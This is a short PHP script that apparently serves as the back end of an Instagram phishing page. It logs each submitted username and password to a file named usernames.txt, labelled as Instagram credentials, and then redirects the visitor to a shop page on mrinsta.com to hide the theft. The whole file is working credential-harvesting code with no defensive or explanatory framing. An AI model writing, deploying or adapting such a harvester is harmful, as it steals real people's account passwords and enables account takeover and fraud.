<?php

file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.mrinsta.com/?add-to-cart=193&variation_id=106906/');
exit();
?>
